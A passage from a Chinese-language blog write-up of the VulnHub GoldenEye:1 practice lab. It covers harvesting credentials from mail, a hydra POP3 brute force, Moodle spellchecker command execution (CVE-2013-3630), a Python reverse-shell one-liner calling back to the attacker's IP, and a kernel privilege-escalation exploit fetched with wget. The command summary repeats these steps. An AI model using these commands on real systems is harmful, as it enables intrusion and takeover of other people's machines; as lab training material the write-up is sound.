<p><img src="/../../../assets/WriteUp%EF%BC%9ACyber-Range/VulnHub/GoldenEye%EF%BC%9A1/ec7377f8213840d5b869501a49212aea.png" alt="在这里插入图片描述"></p>
<p><img src="/../../../assets/WriteUp%EF%BC%9ACyber-Range/VulnHub/GoldenEye%EF%BC%9A1/8ad81c277bed4e4b8a168fb79b473e94.png" alt="在这里插入图片描述"></p>
<p>接下来查看一下 natalya 用户的邮件。</p>
<p><img src="/../../../assets/WriteUp%EF%BC%9ACyber-Range/VulnHub/GoldenEye%EF%BC%9A1/7eb7ef0af9cd49eb99243aa821162e82.png" alt="在这里插入图片描述"></p>
<p><img src="/../../../assets/WriteUp%EF%BC%9ACyber-Range/VulnHub/GoldenEye%EF%BC%9A1/dec215a82e794fcbb3f186e3a1872e4b.png" alt="在这里插入图片描述"></p>
<p><img src="/../../../assets/WriteUp%EF%BC%9ACyber-Range/VulnHub/GoldenEye%EF%BC%9A1/2fc88c1857e54478827c9caf4a5cd631.png" alt="在这里插入图片描述"></p>
<p>获得了一个用户信息。</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username: xenia</span><br><span class="line">password: RCP90rulez!</span><br></pre></td></tr></table></div></figure>

<p>除此以外获得了一个域名与网址信息。</p>
<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">severnaya-station.com</span><br><span class="line">severnaya-station.com/gnocertdir</span><br></pre></td></tr></table></div></figure>

<p>如果直接用 ip 访问是以下效果：</p>
<p><img src="/../../../assets/WriteUp%EF%BC%9ACyber-Range/VulnHub/GoldenEye%EF%BC%9A1/f61a3db4d4ef4e7c9cf9b8c294b45187.png" alt="在这里插入图片描述"></p>
<p>那就将 ip 与域名映射写进 hosts 文件。</p>
<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">192.168.8.137    severnaya-station.com</span><br></pre></td></tr></table></div></figure>

<p>Windows hosts 文件位置：<font style="background:#70AD47">C:\Windows\System32\drivers\etc\hosts</font><br>Linux hosts 文件位置：<font style="background:#70AD47">&#x2F;etc&#x2F;hosts</font></p>
<p>再次访问网站：</p>
<p><img src="/../../../assets/WriteUp%EF%BC%9ACyber-Range/VulnHub/GoldenEye%EF%BC%9A1/ee4c5792eea1479888deab470e8b8e90.png" alt="在这里插入图片描述"></p>
<p>网站 CMS 为 Moodle。</p>
<p>也可以用 <code>whatweb</code> 工具检测：<br><code>whatweb http://severnaya-station.com/gnocertdir/</code></p>
<p><img src="/../../../assets/WriteUp%EF%BC%9ACyber-Range/VulnHub/GoldenEye%EF%BC%9A1/84b3c3af8bc6461faeaddc3771072de0.png" alt="在这里插入图片描述"></p>
<p>网站需要登录，尝试使用以下用户信息登录网站：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username: xenia</span><br><span class="line">password: RCP90rulez!</span><br></pre></td></tr></table></div></figure>

<p><img src="/../../../assets/WriteUp%EF%BC%9ACyber-Range/VulnHub/GoldenEye%EF%BC%9A1/4592d6c73b6a4e9480e31b870246517f.png" alt="在这里插入图片描述"></p>
<p><img src="/../../../assets/WriteUp%EF%BC%9ACyber-Range/VulnHub/GoldenEye%EF%BC%9A1/442b454a515b4093802869251ddd3beb.png" alt="在这里插入图片描述"></p>
<p>查看未读邮件。</p>
<p><img src="/../../../assets/WriteUp%EF%BC%9ACyber-Range/VulnHub/GoldenEye%EF%BC%9A1/6e84ddb233594a868742781b6fc4801c.png" alt="在这里插入图片描述"></p>
<blockquote>
<p>这里发现 CMS 为 Moodle 2.2.3。</p>
</blockquote>
<p><img src="/../../../assets/WriteUp%EF%BC%9ACyber-Range/VulnHub/GoldenEye%EF%BC%9A1/4d312448a4eb4d23ad5dc79716e2b40a.png" alt="在这里插入图片描述"></p>
<p>得到了一个新用户：doak</p>
<p><strong>使用 hydra 爆破一下 pop3</strong>。<br><code>hydra -l doak -P /usr/share/wordlists/fasttrack.txt 192.168.8.137 -s 55007 pop3</code></p>
<p>爆破出用户名与密码：</p>
<p><img src="/../../../assets/WriteUp%EF%BC%9ACyber-Range/VulnHub/GoldenEye%EF%BC%9A1/6fb9613d509c4c89ada72aa898b7e75b.png" alt="在这里插入图片描述"></p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">login: doak    password: goat</span><br></pre></td></tr></table></div></figure>

<p><strong>通过 nc 登录 pop3 查看邮件</strong>。</p>
<figure class="highlight shell"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">nc -nv 192.168.8.137 55007    # 登录邮箱</span><br><span class="line">user doak                     # 登录用户</span><br><span class="line">pass goat                     # 登录密码</span><br><span class="line">list                          # 查看邮件数量</span><br><span class="line">retr 1                        # 查看邮件内容</span><br></pre></td></tr></table></div></figure>

<p><img src="/../../../assets/WriteUp%EF%BC%9ACyber-Range/VulnHub/GoldenEye%EF%BC%9A1/3c9ac116a8be46339a388616ce0382b3.png" alt="在这里插入图片描述"><br>获得了一个用户信息。</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username: dr_doak</span><br><span class="line">password: 4England!</span><br></pre></td></tr></table></div></figure>

<p>用这个用户信息登录进网站：</p>
<p><img src="/../../../assets/WriteUp%EF%BC%9ACyber-Range/VulnHub/GoldenEye%EF%BC%9A1/3087dc8207df497080eafecd40495ef9.png" alt="在这里插入图片描述"><br>发现一个私人文件，下载后查看。</p>
<p><img src="/../../../assets/WriteUp%EF%BC%9ACyber-Range/VulnHub/GoldenEye%EF%BC%9A1/6bdbd1c74c8640b7b2a637ff3967c051.png" alt="在这里插入图片描述"><br>给了一个网址目录：<br><font style="background:#70AD47">&#x2F;dir007key&#x2F;for-007.jpg</font></p>
<p>访问查看：</p>
<p><img src="/../../../assets/WriteUp%EF%BC%9ACyber-Range/VulnHub/GoldenEye%EF%BC%9A1/363a4d29ca5a4d669d2be3a8f57cc2ae.png" alt="在这里插入图片描述"><br>根据邮件提示检查一下图片，先将图片下载。<br><code>wget http://severnaya-station.com/dir007key/for-007.jpg</code></p>
<p>之后可以用以下工具进行分析：</p>
<ul>
<li><code>binwalk</code>：路由逆向分析工具，用于获取给定二进制镜像文件嵌入的文件和代码</li>
<li><code>exiftool</code>：图虫，解析图片 exif 信息</li>
<li><code>strings</code>：用于打印文件中可打印字符串（ASCII 码）</li>
</ul>
<p><img src="/../../../assets/WriteUp%EF%BC%9ACyber-Range/VulnHub/GoldenEye%EF%BC%9A1/2e9f8e7a1c234393bae4839b3aab1846.png" alt="在这里插入图片描述"><br><img src="/../../../assets/WriteUp%EF%BC%9ACyber-Range/VulnHub/GoldenEye%EF%BC%9A1/c9cb249b80fa469da40ee27babebb209.png" alt="在这里插入图片描述"><br><img src="/../../../assets/WriteUp%EF%BC%9ACyber-Range/VulnHub/GoldenEye%EF%BC%9A1/0931e53af4f6491fa3d6f24513d9e84d.png" alt="在这里插入图片描述"><br>识别出一串 base64 编码：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eFdpbnRlcjE5OTV4IQ==</span><br></pre></td></tr></table></div></figure>

<p>解码：</p>
<p><img src="/../../../assets/WriteUp%EF%BC%9ACyber-Range/VulnHub/GoldenEye%EF%BC%9A1/023aa331499c44b78e2d55672a009a4c.png" alt="在这里插入图片描述"></p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">eFdpbnRlcjE5OTV4IQ==</span><br><span class="line">xWinter1995x!</span><br></pre></td></tr></table></div></figure>

<p>根据邮件中提示猜测这是 admin 账户的密码。</p>
<p>尝试登录网站：</p>
<p><img src="/../../../assets/WriteUp%EF%BC%9ACyber-Range/VulnHub/GoldenEye%EF%BC%9A1/7d4fb5ac40744b47b2e6972488a03112.png" alt="在这里插入图片描述"><br>没有发现什么可以利用的。</p>
<p>那尝试从 CMS 入手。搜索一下 Moodle 2.2.3 的漏洞。<br>关键字：<code>Moodle 2.2.3 poc exp</code></p>
<p>发现 <strong>CVE-2013-3630</strong> 漏洞。尝试利用。</p>
<p>漏洞 exp 详情：</p>
<p>《Moodle - Remote Command Execution (Metasploit)》：<br><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/29324" >https://www.exploit-db.com/exploits/29324</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>从 exp 中可以看到，需要将拼写检查 google spell 换成 PSpellSHell。</p>
<p><img src="/../../../assets/WriteUp%EF%BC%9ACyber-Range/VulnHub/GoldenEye%EF%BC%9A1/4c2465c6050f4dfd9b76da2270dddb07.png" alt="在这里插入图片描述"><br>刚好用 admin 登录的 CMS 后台可以进行此设置。</p>
<p><img src="/../../../assets/WriteUp%EF%BC%9ACyber-Range/VulnHub/GoldenEye%EF%BC%9A1/1f216bcd0126411288e63cd0783a8844.png" alt="在这里插入图片描述"></p>
<blockquote>
<p>原因是目标主机上不存在 GCC 编译，只能 CC 编译，所以需要把 Google Spell 改成 PSpellShell。</p>
</blockquote>

        <h2 id="2-2：漏洞分析-渗透攻击"   >
          <a href="#2-2：漏洞分析-渗透攻击" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-2：漏洞分析-渗透攻击" class="headerlink" title="2.2：漏洞分析 &amp; 渗透攻击"></a>2.2：漏洞分析 &amp; 渗透攻击</h2>
      <p><strong>启动 MSF</strong>。<br><code>msfdb init &amp;&amp; msfconsole</code></p>
<p>查找相关漏洞。<br><code>search CVE-2013-3630</code></p>
<p><img src="/../../../assets/WriteUp%EF%BC%9ACyber-Range/VulnHub/GoldenEye%EF%BC%9A1/e3860957f0e340a599e73139399555d3.png" alt="在这里插入图片描述"><br>使用序号为 0 的模块进行渗透。</p>
<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">use 0</span><br><span class="line">show options</span><br><span class="line"><span class="built_in">set</span> USERNAME admin</span><br><span class="line"><span class="built_in">set</span> PASSWORD xWinter1995x!</span><br><span class="line"><span class="built_in">set</span> RHOSTS severnaya-station.com    <span class="comment"># 设置目标主机</span></span><br><span class="line"><span class="built_in">set</span> TARGETURI /gnocertdir           <span class="comment"># 设置目录</span></span><br></pre></td></tr></table></div></figure>

<p><img src="/../../../assets/WriteUp%EF%BC%9ACyber-Range/VulnHub/GoldenEye%EF%BC%9A1/49c1a5419fbc476d8ab7ed9cc03c44f5.png" alt="在这里插入图片描述"><br>为了获得反弹 shell 的会话，还需要<strong>设置 payload</strong>。</p>
<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> payload cmd/unix/reverse    <span class="comment"># 使用 cmd/unix/reverse</span></span><br><span class="line">show options</span><br><span class="line"><span class="built_in">set</span> lhost 192.168.8.15          <span class="comment"># 设置攻击机 ip</span></span><br></pre></td></tr></table></div></figure>

<p><img src="/../../../assets/WriteUp%EF%BC%9ACyber-Range/VulnHub/GoldenEye%EF%BC%9A1/d46e50c715574cc28c09a2e21f708568.png" alt="在这里插入图片描述"><br>执行。</p>
<p><img src="/../../../assets/WriteUp%EF%BC%9ACyber-Range/VulnHub/GoldenEye%EF%BC%9A1/b886f345851644dc8d4bdc1543f17b63.png" alt="在这里插入图片描述"><br><strong>好，失败了</strong>。</p>
<p>查阅资料发现可能是 msf 版本过高问题，但也发现了手工利用的方法。</p>
<blockquote>
<p>《VulnHub-GoldenEye-1 靶场渗透测试》：<br><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/260592.html" >https://www.freebuf.com/articles/web/260592.html</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
</blockquote>
<p><strong>开始手工利用漏洞</strong>。</p>
<p>在下图所示路径设置中更改为以下 payload：</p>
<p><img src="/../../../assets/WriteUp%EF%BC%9ACyber-Range/VulnHub/GoldenEye%EF%BC%9A1/0bbd06cb0b304616bf6fbef5676e99da.png" alt="在这里插入图片描述"></p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.8.15&quot;,6666));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span></span><br></pre></td></tr></table></div></figure>

<p>然后在 kali 终端<strong>使用 nc 监听相应端口</strong>。<br><code>nc -lnvp 6666</code></p>
<p>之后在下图所示路径中新建文章，随便输入字符，点击 “ Toggle Spellchecker ” 后就会反弹 shell。</p>
<p><img src="/../../../assets/WriteUp%EF%BC%9ACyber-Range/VulnHub/GoldenEye%EF%BC%9A1/1213295f0c74443ca18a772baa58b552.png" alt="在这里插入图片描述"><br><img src="/../../../assets/WriteUp%EF%BC%9ACyber-Range/VulnHub/GoldenEye%EF%BC%9A1/f12177c88ec149bd85f9a69636a93b75.png" alt="在这里插入图片描述"><br>目标机安装了 python，可以<strong>使用 ptyhon 获取 tty</strong>，不然有些命令无法执行。<br><code>python -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;</code></p>
<blockquote>
<p>teletypewriter（tty），表示终端或终端模拟器。</p>
</blockquote>
<p><img src="/../../../assets/WriteUp%EF%BC%9ACyber-Range/VulnHub/GoldenEye%EF%BC%9A1/9b1dc0d7706b4f83954b7715444fc0a9.png" alt="在这里插入图片描述"><br>至此获取了目标机器一个低权限 shell。</p>

        <h2 id="2-3：后渗透"   >
          <a href="#2-3：后渗透" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-3：后渗透" class="headerlink" title="2.3：后渗透"></a>2.3：后渗透</h2>
      <p>进行提权。</p>
<p><strong>查看一下系统内核</strong>：<br><code>uname -a</code></p>
<p><img src="/../../../assets/WriteUp%EF%BC%9ACyber-Range/VulnHub/GoldenEye%EF%BC%9A1/9d128cc6bea94ff6afb5da0917ddfef9.png" alt="在这里插入图片描述"><br>搜索一下相关的内核漏洞。</p>
<p><img src="/../../../assets/WriteUp%EF%BC%9ACyber-Range/VulnHub/GoldenEye%EF%BC%9A1/87d9161c97e84783a43fe61d79f2878b.png" alt="在这里插入图片描述"><br><img src="/../../../assets/WriteUp%EF%BC%9ACyber-Range/VulnHub/GoldenEye%EF%BC%9A1/aafe42cba8474e3e887da6e7163dc605.png" alt="在这里插入图片描述"><br>得到 EDB-ID：37292</p>
<p><strong>搜索 kali 本地 exp 库中 37292 攻击脚本信息</strong>。<br><code>searchsploit 37292</code></p>
<p><img src="/../../../assets/WriteUp%EF%BC%9ACyber-Range/VulnHub/GoldenEye%EF%BC%9A1/7ad55d87d64d4abeaecc7f9ba1ebe770.png" alt="在这里插入图片描述"><br>将该文件复制到一个目录中。</p>
<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cp</span> /usr/share/exploitdb/exploits/linux/local/37292.c /root/Desktop/GoldenEye-1/</span><br></pre></td></tr></table></div></figure>

<p>查看目标机器，发现目标没有安装 <code>gcc</code>，但安装了 <code>cc</code>。还安装了 <code>wget</code></p>
<blockquote>
<p>C 语言用 gcc 编译 .c 文件为可执行文件。可以用 cc 代替编译。</p>
</blockquote>
<p><img src="/../../../assets/WriteUp%EF%BC%9ACyber-Range/VulnHub/GoldenEye%EF%BC%9A1/0d4ca3824c6e49ec87291536e1f18282.png" alt="在这里插入图片描述"><br>原本的 <font style="background:#70AD47">37292.c</font> 文件使用 gcc，需要将第 143 行的 gcc 改为 cc。</p>
<p><img src="/../../../assets/WriteUp%EF%BC%9ACyber-Range/VulnHub/GoldenEye%EF%BC%9A1/5c41503eb3c64ec4b0a771e890d3163e.png" alt="在这里插入图片描述"><br><strong>在相应目录下开启一个简单的 http 服务</strong>，便于使目标机器下载相应利用代码。<br><code>python3 -m http.server 8088</code></p>
<p><img src="/../../../assets/WriteUp%EF%BC%9ACyber-Range/VulnHub/GoldenEye%EF%BC%9A1/a653e56a94d847369bee89776849db2e.png" alt="在这里插入图片描述"><br>目标机器中，进入 <font style="background:#70AD47">&#x2F;tmp&#x2F;</font> 目录，下载。<br><code>wget http://192.168.8.15:8088/37292.c</code></p>
<p><img src="/../../../assets/WriteUp%EF%BC%9ACyber-Range/VulnHub/GoldenEye%EF%BC%9A1/d27084c62114484889ecf6caa3c05b47.png" alt="在这里插入图片描述"><br><strong>编译，并给可执行文件赋权，然后执行</strong>。</p>
<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cc -o rootshell 37292.c</span><br><span class="line"><span class="built_in">chmod</span> +x rootshell</span><br><span class="line">./rootshell</span><br></pre></td></tr></table></div></figure>

<p><img src="/../../../assets/WriteUp%EF%BC%9ACyber-Range/VulnHub/GoldenEye%EF%BC%9A1/270f9d44fcae4cf881a4bd78351f3f01.png" alt="在这里插入图片描述"><br>成功提权至 root。</p>
<p>最后使用 ptyhon 获取 tty。<br><code>python -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;</code></p>
<p><img src="/../../../assets/WriteUp%EF%BC%9ACyber-Range/VulnHub/GoldenEye%EF%BC%9A1/f9d9323c1a46476e8d65a76c67d0efaf.png" alt="在这里插入图片描述"><br><img src="/../../../assets/WriteUp%EF%BC%9ACyber-Range/VulnHub/GoldenEye%EF%BC%9A1/93d5133c7d6345ad97ba578b17c71083.png" alt="在这里插入图片描述"><br><img src="/../../../assets/WriteUp%EF%BC%9ACyber-Range/VulnHub/GoldenEye%EF%BC%9A1/8b234f4a4e724be58b49270ac4b06eb6.png" alt="在这里插入图片描述"><br>完结撒花！</p>

        <h1 id="3：总结"   >
          <a href="#3：总结" class="heading-link"><i class="fas fa-link"></i></a><a href="#3：总结" class="headerlink" title="3：总结"></a>3：总结</h1>
      <p>该靶场要点在于对敏感信息泄露的收集。</p>

        <h2 id="3-1：命令-工具"   >
          <a href="#3-1：命令-工具" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-1：命令-工具" class="headerlink" title="3.1：命令 &amp; 工具"></a>3.1：命令 &amp; 工具</h2>
      <ul>
<li>nmap</li>
<li>BurpSuite</li>
<li>hydra</li>
<li>netcat</li>
<li>whatweb</li>
<li>binwalk</li>
<li>exiftool</li>
<li>strings</li>
<li>Exploit Database<br><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.exploit-db.com/" >https://www.exploit-db.com/</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></li>
<li>MSF</li>
<li>python</li>
<li>uname</li>
<li>searchsploit</li>
<li>cc</li>
<li>wget</li>
</ul>

        <h2 id="3-2：关键技术"   >
          <a href="#3-2：关键技术" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-2：关键技术" class="headerlink" title="3.2：关键技术"></a>3.2：关键技术</h2>
      <ul>
<li><p><strong>主机发现</strong>：<br><code>nmap &lt;ip cidr&gt; -sn</code></p>
</li>
<li><p><strong>目标信息扫描</strong>，端口扫描、服务探测、操作系统探测：<br><code>nmap &lt;target&gt; -p- -sC -sV -O</code></p>
</li>
<li><p><strong>源码 js 文件泄露敏感信息</strong>，html 编码字符串解密。</p>
</li>
<li><p><strong>hydra 爆破邮件服务（pop3）</strong>：<br><code>hydra -L &lt;name file&gt; -P &lt;password file&gt; &lt;target&gt; -s &lt;port&gt; pop3</code><br><code>hydra -l &lt;name&gt; -P &lt;password file&gt; &lt;target&gt; -s &lt;port&gt; pop3</code></p>
</li>
<li><p><strong>netcat 登录查看邮件</strong>：</p>
</li>
</ul>
<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">nc -nv &lt;target&gt; &lt;port&gt;    <span class="comment"># 登录邮箱</span></span><br><span class="line">user &lt;username&gt;           <span class="comment"># 登录用户</span></span><br><span class="line">pass &lt;password&gt;           <span class="comment"># 登录密码</span></span><br><span class="line">list                      <span class="comment"># 查看邮件数量</span></span><br><span class="line">retr &lt;num&gt;                <span class="comment"># 查看邮件内容</span></span><br></pre></td></tr></table></div></figure>

<ul>
<li><p><strong>邮件泄露敏感信息</strong>。</p>
</li>
<li><p><strong>ip 与域名映射写进 hosts 文件</strong>。<br>Windows hosts 文件位置：<font style="background:#70AD47">C:\Windows\System32\drivers\etc\hosts</font><br>Linux hosts 文件位置：<font style="background:#70AD47">&#x2F;etc&#x2F;hosts</font></p>
</li>
<li><p><strong>whatweb 工具检测网站</strong>：<br><code>whatweb &lt;URL&gt;</code></p>
</li>
<li><p><strong>wget 下载文件</strong>：<br><code>wget &lt;URI&gt;</code></p>
</li>
<li><p><strong>图片隐写分析</strong>：<br><code>binwalk</code>：路由逆向分析工具，用于获取给定二进制镜像文件嵌入的文件和代码<br><code>exiftool</code>：图虫，解析图片 exif 信息<br><code>strings</code>：用于打印文件中可打印字符串（ASCII 码）</p>
</li>
<li><p><strong>CVE-2013-3630 漏洞利用</strong>。（msf 利用、手工利用）</p>
</li>
<li><p><strong>python 反弹 shell</strong>：</p>
</li>
</ul>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.8.15&quot;,6666));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 代码解释</span></span><br><span class="line"><span class="keyword">import</span> socket,subprocess,os;                           <span class="comment"># 导入 socket、subprocess 和 os 模块</span></span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);    <span class="comment"># 创建一个 TCP 套接字</span></span><br><span class="line">s.connect((<span class="string">&quot;&lt;ip&gt;&quot;</span>,&lt;port&gt;));                            <span class="comment"># 连接远程主机的 IP 与端口</span></span><br><span class="line">os.dup2(s.fileno(),<span class="number">0</span>);                                 <span class="comment"># 将标准输入重定向到套接字的文件描述符</span></span><br><span class="line">os.dup2(s.fileno(),<span class="number">1</span>);                                 <span class="comment"># 将标准输出重定向到套接字的文件描述符</span></span><br><span class="line">os.dup2(s.fileno(),<span class="number">2</span>);                                 <span class="comment"># 将标准错误重定向到套接字的文件描述符</span></span><br><span class="line">p=subprocess.call([<span class="string">&quot;/bin/sh&quot;</span>,<span class="string">&quot;-i&quot;</span>]);                   <span class="comment"># 通过 subprocess 模块调用 /bin/sh，并使用 -i 参数以交互模式运行 shell。</span></span><br></pre></td></tr></table></div></figure>

<ul>
<li><p><strong>netcat 监听端口反弹 shell</strong>：<br><code>nc -lnvp &lt;port&gt;</code></p>
</li>
<li><p><strong>使用 ptyhon 获取 tty</strong>（teletypewriter，表示终端或终端模拟器）：<br><code>python -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;</code></p>
</li>
<li><p><strong>查看系统内核</strong>：<br><code>uname -a</code></p>
</li>
<li><p><strong>CVE-2015-1328 漏洞利用</strong>。EDB-ID：37292。</p>
</li>
<li><p><strong>搜索 kali 本地 exp 库中攻击脚本信息</strong>：<br><code>searchsploit &lt;ID&gt;</code></p>
</li>
<li><p><strong>在目录下开启一个简单 http 服务</strong>：<br><code>python3 -m http.server &lt;port&gt;</code></p>
</li>
<li><p><strong>编译 c 文件，并赋权，执行</strong>。（利用系统内核漏洞提权）</p>
</li>
</ul>
<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cc -o &lt;filename&gt; &lt;c file&gt;</span><br><span class="line"><span class="built_in">chmod</span> +x &lt;filename&gt;</span><br><span class="line">./&lt;filename&gt;</span><br></pre></td></tr></table></div></figure>


<hr>
<p><font color="#778899">
人之忌，在好为人师。
</font></p>
<p align="right"><font color="#778899">
——《孟子》（战国）
</font></p>

</div><footer class="post-footer"><div class="post-ending ending"><div class="ending__text">------ 本文结束，感谢您的阅读 ------</div></div><div class="post-copyright copyright"><div class="copyright-author"><span class="copyright-author__name">本文作者: </span><span class="copyright-author__value"><a href="https://blog.lens-shrine.top">镜坛主</a></span></div><div class="copyright-link"><span class="copyright-link__name">本文链接: </span><span class="copyright-link__value"><a href="https://blog.lens-shrine.top/2024/02/16/WriteUp%EF%BC%9ACyber-Range/VulnHub/GoldenEye%EF%BC%9A1/">https://blog.lens-shrine.top/2024/02/16/WriteUp%EF%BC%9ACyber-Range/VulnHub/GoldenEye%EF%BC%9A1/</a></span></div><div class="copyright-notice"><span class="copyright-notice__name">版权声明: </span><span class="copyright-notice__value">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" rel="external nofollow" target="_blank">BY-NC-SA</a> 许可协议。转载请注明出处！</span></div></div><nav class="post-paginator paginator"><div class="paginator-prev"><a class="paginator-prev__link" href="/2024/03/28/WriteUp%EF%BC%9ACyber-Range/VulnHub/Lampiao%EF%BC%9A1/"><span class="paginator-prev__icon"><i class="fas fa-angle-left"></i></span><span class="paginator-prev__text">《VulnHub》Lampião：1</span></a></div><div class="paginator-next"><a class="paginator-next__link" href="/2024/02/09/%E7%95%AA%E5%A4%96%EF%BC%9A%E9%9D%92%E7%AB%B9%E5%B0%8F%E8%BD%A9/%E5%AE%B6%E5%B8%B8%E8%8F%9C%E8%B0%B1/%E7%BA%A2%E7%83%A7%E7%89%9B%E8%82%89/"><span class="paginator-prev__text">《家常菜谱》红烧牛肉</span><span class="paginator-next__icon"><i class="fas fa-angle-right"></i></span></a></div></nav></footer></div></div></div><div class="sidebar-wrap" id="sidebar-wrap"><aside class="sidebar" id="sidebar"><div class="sidebar-nav"><span class="sidebar-nav-toc current">文章目录</span><span class="sidebar-nav-ov">站点概览</span></div><section class="sidebar-toc"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#1%EF%BC%9A%E9%9D%B6%E5%9C%BA%E4%BF%A1%E6%81%AF"><span class="toc-text">
          1：靶场信息</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2%EF%BC%9A%E6%89%93%E9%9D%B6"><span class="toc-text">
          2：打靶</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#2-1%EF%BC%9A%E6%83%85%E6%8A%A5%E6%94%B6%E9%9B%86-%E5%A8%81%E8%83%81%E5%BB%BA%E6%A8%A1"><span class="toc-text">
          2.1：情报收集 &amp; 威胁建模</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-2%EF%BC%9A%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-%E6%B8%97%E9%80%8F%E6%94%BB%E5%87%BB"><span class="toc-text">
          2.2：漏洞分析 &amp; 渗透攻击</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-3%EF%BC%9A%E5%90%8E%E6%B8%97%E9%80%8F"><span class="toc-text">
          2.3：后渗透</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#3%EF%BC%9A%E6%80%BB%E7%BB%93"><span class="toc-text">
          3：总结</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#3-1%EF%BC%9A%E5%91%BD%E4%BB%A4-%E5%B7%A5%E5%85%B7"><span class="toc-text">
          3.1：命令 &amp; 工具</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-2%EF%BC%9A%E5%85%B3%E9%94%AE%E6%8A%80%E6%9C%AF"><span class="toc-text">
